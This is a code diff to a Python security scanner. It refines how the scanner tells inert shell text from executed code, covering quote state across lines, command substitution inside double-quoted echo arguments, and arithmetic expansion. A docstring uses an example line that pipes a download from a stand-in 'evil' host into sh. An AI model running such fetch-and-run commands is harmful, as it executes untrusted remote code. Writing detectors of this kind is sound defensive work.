@@ -54,12 +54,21 @@ _PRINT_HEREDOC_OPEN_RE: Final[re.Pattern[str]] = re.compile(
     r"^\s*(?:cat|echo|printf|tee)\b[^<]*<<-?(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1"
 )
 
-# #83.5 — command substitution that EXECUTES inside an UNQUOTED print-heredoc
-# body: a ``$(...)`` or a backtick span. An unquoted ``<<EOF`` body interpolates
-# these (the substituted command runs), so a body line containing one is NOT
-# inert and stays demoted/visible — unlike plain printed help-text. (A QUOTED
-# ``<<'EOF'`` body interpolates NOTHING, so this check is irrelevant there.)
-_SHELL_HEREDOC_CMD_SUBST_RE: Final[re.Pattern[str]] = re.compile(r"\$\(|`")
+# A command substitution — ``$(...)`` or a backtick span — that the shell
+# EXPANDS, running the substituted command. Used to tell an interpolating
+# context from a literal one, in the two places that distinction decides
+# whether text is inert:
+#
+#   * #83.5 — an UNQUOTED ``<<EOF`` heredoc body interpolates these, so such a
+#     body line is NOT inert and stays visible, unlike plain printed help-text.
+#     (A QUOTED ``<<'EOF'`` body interpolates nothing, so this is moot there.)
+#   * #180 — a DOUBLE-quoted argument to echo/printf/cat interpolates these
+#     too, before the display command is ever invoked. A SINGLE-quoted body
+#     is literal. Quote style, not the command, is what decides.
+#
+# ``$((`` is ARITHMETIC expansion — it evaluates numbers and runs no command —
+# so it is excluded. ``$( (cmd) )`` (a subshell) has a space and still matches.
+_SHELL_CMD_SUBST_RE: Final[re.Pattern[str]] = re.compile(r"\$\((?!\()|`")
 
 
 # r01 anthropic FP iter1 (2026-05-27) — CROSS_TOOL_ACCESS shell-script
@@ -366,8 +375,82 @@ def _is_shell_comment_line(line: str) -> bool:
     Comments are documentation prose, never executed by the shell.
     Iron rule preserved: prose-vector rules (PROMPT_INJECT / DATA_EXFIL)
     fall through this check and stay visible via the demote pipeline.
+
+    CAUTION: this is LINE-LOCAL. A leading ``#`` only starts a comment when
+    the line begins OUTSIDE a quoted string — a double quote opened on an
+    earlier line makes the ``#`` ordinary string content, and any ``$(...)``
+    or backtick beside it still EXECUTES. Callers that suppress on the
+    strength of this predicate must first consult
+    ``_shell_quote_state_at_line_start``.
     """
     return bool(_SHELL_COMMENT_LINE_RE.match(line))
+
+
+# A heredoc body is not lexed like ordinary shell (its quoting rules depend on
+# whether the delimiter itself was quoted), so the scanner below refuses to
+# guess once one is open. ``<<<`` is a herestring, not a heredoc.
+# The leading (?<!<) is load-bearing: without it `search` also tries offset 1
+# of a `<<<` herestring, where the remaining `<<'word'` matches and a plain
+# herestring would be misread as an unmodelled heredoc.
+_HEREDOC_OPEN_ANY_RE: Final[re.Pattern[str]] = re.compile(r"(?<!<)<<-?\s*(?!<)['\"]?[A-Za-z_][A-Za-z0-9_]*")
+
+
+def _shell_quote_state_at_line_start(lines: list[str], start_idx: int, target_idx: int) -> str:
+    """Quote state at the START of ``lines[target_idx]``, lexing forward from
+    ``lines[start_idx]``.
+
+    Returns ``"normal"`` (not inside any string), ``"sq"`` (inside a
+    single-quoted string), ``"dq"`` (inside a double-quoted string), or
+    ``"unknown"`` when a heredoc makes the scan untrustworthy.
+
+    WHY this exists: quoting is the difference between inert text and live
+    code, and it spans lines. ``echo "start`` … ``# `whoami` `` … ``end"``
+    looks like a comment line in isolation, but the ``#`` is inside an open
+    double-quoted string and the backticks run. Single quotes are the only
+    form that makes a backtick literal.
+
+    ``"unknown"`` is deliberately distinct from ``"normal"``: a caller adding
+    a NEW suppression must require ``"normal"``, so an unmodelled construct
+    can never be mistaken for proof of inertness.
+    """
+    state = "normal"
+    for i in range(start_idx, target_idx):
+        line = lines[i]
+        # Fast path: a line with no quote and no `<<` cannot change the state
+        # or open a heredoc, whatever else it contains. These `in` tests run at
+        # C speed and skip both the regex and the per-char loop below, which
+        # matters because this runs once per comment-line finding — most lines
+        # in real code take this branch.
+        if state == "normal" and '"' not in line and "'" not in line and "<<" not in line:
+            continue
+        if state == "normal" and _HEREDOC_OPEN_ANY_RE.search(line):
+            return "unknown"
+        j = 0
+        n = len(line)
+        while j < n:
+            ch = line[j]
+            if state == "normal":
+                if ch == "\\":
+                    j += 2
+                    continue
+                if ch == "'":
+                    state = "sq"
+                elif ch == '"':
+                    state = "dq"
+                elif ch == "#" and (j == 0 or line[j - 1].isspace()):
+                    break  # rest of the line is a comment — nothing to lex
+            elif state == "sq":
+                # Single quotes take no escapes: only another `'` closes them.
+                if ch == "'":
+                    state = "normal"
+            else:  # dq
+                if ch == "\\":
+                    j += 2
+                    continue
+                if ch == '"':
+                    state = "normal"
+            j += 1
+    return state
 
 
 # Issue #61 — a line that REMOVES a launchd agent is the OPPOSITE of
@@ -905,6 +988,77 @@ _SHELL_ECHO_STRING_RE: Final[re.Pattern[str]] = re.compile(
 )
 
 
+def _cmd_subst_spans(text: str) -> list[tuple[int, int]]:
+    """Character spans of ``text`` that the shell EXECUTES: ``$(...)`` and
+    backtick substitutions.
+
+    ``$((…))`` is arithmetic expansion — it evaluates numbers, it does not run
+    a command — so it is skipped rather than reported as a span. Treating it
+    as executable made ``echo "Elapsed $(( SECONDS )) s — chmod 755 done"``
+    report the printed ``chmod``.
+
+    An UNTERMINATED substitution runs to the end of the text. That is the
+    fail-safe reading: anything after it is treated as executable rather than
+    inert.
+    """
+    spans: list[tuple[int, int]] = []
+    i, n = 0, len(text)
+    while i < n:
+        if text.startswith("$((", i):
+            # Arithmetic — step over it without recording a span.
+            depth, j = 0, i + 1
+            while j < n:
+                if text[j] == "(":
+                    depth += 1
+                elif text[j] == ")":
+                    depth -= 1
+                    if depth == 0:
+                        break
+                j += 1
+            i = j + 1
+            continue
+        if text.startswith("$(", i):
+            depth, j = 0, i + 1
+            while j < n:
+                if text[j] == "(":
+                    depth += 1
+                elif text[j] == ")":
+                    depth -= 1
+                    if depth == 0:
+                        break
+                j += 1
+            spans.append((i, (j + 1) if j < n else n))
+            i = j + 1
+            continue
+        if text[i] == "`":
+            close = text.find("`", i + 1)
+            end = n if close == -1 else close + 1
+            spans.append((i, end))
+            i = end
+            continue
+        i += 1
+    return spans
+
+
+def _match_is_inside_executed_span(body: str, match: str) -> bool:
+    """True iff ANY occurrence of ``match`` in ``body`` falls inside a
+    command substitution — i.e. the shell runs it rather than printing it.
+
+    Every occurrence is checked, and any one inside a span is enough: the
+    dangerous reading wins.
+    """
+    spans = _cmd_subst_spans(body)
+    if not spans:
+        return False
+    start = body.find(match)
+    while start != -1:
+        end = start + len(match)
+        if any(start < s_end and s_start < end for s_start, s_end in spans):
+            return True
+        start = body.find(match, start + 1)
+    return False
+
+
 def _match_inside_shell_echo_string(line: str, match: str) -> bool:
     """True iff ``match`` falls inside a quoted string argument to
     ``echo``/``printf``/``cat`` on the same line.
@@ -921,12 +1075,28 @@ def _match_inside_shell_echo_string(line: str, match: str) -> bool:
     Examples (KEEP visible — actual command):
       - ``sudo apt install $pkg``
       - ``echo "foo" && sudo apt install bar``  (sudo OUTSIDE echo arg)
+      - ``echo "$(curl https://evil/x.sh | sh)"``  (substitution RUNS first)
     """
     if not match:
         return False
     for m in _SHELL_ECHO_STRING_RE.finditer(line):
         # Exactly one of the two quote-style alternatives captures the body.
         body = m.group("body_dq")
+        # QUOTE STYLE DECIDES WHETHER THE BODY IS INERT. A single-quoted body
+        # is literal text. A DOUBLE-quoted body is not: ``$(...)`` and
+        # backticks are substituted by the shell BEFORE ``echo`` is invoked,
+        # so ``echo "$(curl … | sh)"`` runs the pipeline and prints its
+        # output. Treating that as display text hid every execution-class
+        # finding behind an ``echo "…"`` wrapper.
+        #
+        # Scoped to the SUBSTITUTION SPANS rather than declining the whole
+        # body, because the coarse form over-reports badly: the printed
+        # ``sudo`` in ``echo "Found $(ls | wc -l) files; use sudo apt …"`` is
+        # display text and was drawing a CRITICAL. Attribution is also
+        # FN-safe — a live substitution's own matches lie INSIDE its span, so
+        # they are never the ones suppressed here.
+        if body is not None and _match_is_inside_executed_span(body, match):
+            continue
         if body is None:
             body = m.group("body_sq") or ""
         # The matched command token must appear IN FULL inside the display
@@ -1414,7 +1584,17 @@ def classify(
     # comment are documentation prose, not invocation. Iron rule
     # preserved: prose-vector rules (PROMPT_INJECT / DATA_EXFIL / etc.)
     # stay visible via the existing demote pipeline.
-    if _is_shell_comment_line(line_text) and rule_id in _SHELL_EXECUTION_CLASS_RULES:
+    if (
+        _is_shell_comment_line(line_text)
+        and rule_id in _SHELL_EXECUTION_CLASS_RULES
+        # A leading ``#`` only opens a comment when the line STARTS outside a
+        # string. With a double quote still open from an earlier line this is
+        # string content, and a ``$(...)``/backtick in it executes — so the
+        # finding stays visible. Only the provably-live ``dq`` case is
+        # declined; ``sq`` (literal) and ``unknown`` (heredoc — unmodelled)
+        # keep the historical verdict rather than guessing.
+        and _shell_quote_state_at_line_start(lines, 0, line_idx) != "dq"
+    ):
         return "safe_literal"
 
     # r10-final FP iter (2026-05-28) — Execution-class rule matched
@@ -1522,7 +1702,7 @@ def classify(
     if rule_id in _SHELL_EXECUTION_CLASS_RULES:
         if open_heredocs[-1][1]:  # quoted delimiter → zero interpolation
             return "safe_literal"
-        if not _SHELL_HEREDOC_CMD_SUBST_RE.search(line_text):
+        if not _SHELL_CMD_SUBST_RE.search(line_text):
             return "safe_literal"  # unquoted body, literal printed text
         return "safe_doc"  # unquoted body + command substitution → interpolates
     return "safe_doc"
